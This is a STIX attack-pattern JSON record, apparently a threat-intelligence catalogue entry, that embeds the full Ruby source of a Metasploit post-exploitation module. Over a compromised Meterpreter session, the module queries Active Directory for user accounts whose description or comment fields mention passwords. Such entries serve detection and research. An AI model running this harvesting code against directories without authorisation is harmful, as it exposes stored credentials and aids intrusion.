{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e75b6403-d0d9-4c8b-b913-4f26d588c918",
    "created": "2024-08-14T16:33:05.047503Z",
    "modified": "2024-08-14T16:33:05.047507Z",
    "name": "Windows Gather Active Directory User Comments",
    "description": " This module will enumerate user accounts in the default Active Domain (AD) directory which contain 'pass' in their description or comment (case-insensitive) by default. In some cases such users have their passwords specified in these fields.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_ad_user_comments.rb",
            "external_id": "enum_ad_user_comments.rb"
        },
        {
            "source_name": "reference",
            "url": "http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::LDAP\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'\t=> 'Windows Gather Active Directory User Comments',\n        'Description' => %q{\n          This module will enumerate user accounts in the default Active Domain (AD) directory which\n          contain 'pass' in their description or comment (case-insensitive) by default. In some cases,\n          such users have their passwords specified in these fields.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Ben Campbell' ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'References' => [\n          ['URL', 'http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx'],\n        ]\n      )\n    )\n\n    register_options([\n      OptBool.new('STORE_LOOT', [true, 'Store file in loot.', false]),\n      OptString.new('FIELDS', [true, 'Fields to retrieve.', 'userPrincipalName,sAMAccountName,userAccountControl,comment,description']),\n      OptString.new('FILTER', [true, 'Search filter.', '(&(&(objectCategory=person)(objectClass=user))(|(description=*pass*)(comment=*pass*)))']),\n    ])\n  end\n\n  def run\n    fields = datastore['FIELDS'].gsub(/\\s+/, '').split(',')\n    search_filter = datastore['FILTER']\n    max_search = datastore['MAX_SEARCH']\n\n    begin\n      q = query(search_filter, max_search, fields)\n      if q.nil? || q[:results].empty?\n        return\n      end\n    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e\n      # Can't bind or in a network w/ limited accounts\n      print_error(e.message)\n      return\n    end\n\n    # Results table holds raw string data\n    results_table = Rex::Text::Table.new(\n      'Header' => 'Domain Users',\n      'Indent' => 1,\n      'SortIndex' => -1,\n      'Columns' => fields\n    )\n\n    q[:results].each do |result|\n      row = []\n\n      result.each do |field|\n        if field[:value].nil?\n          row << ''\n        else\n          row << field[:value]\n\n        end\n      end\n\n      results_table << row\n    end\n\n    print_line results_table.to_s\n\n    if datastore['STORE_LOOT']\n      stored_path = store_loot('ad.users', 'text/plain', session, results_table.to_csv)\n      print_good(\"Results saved to: #{stored_path}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}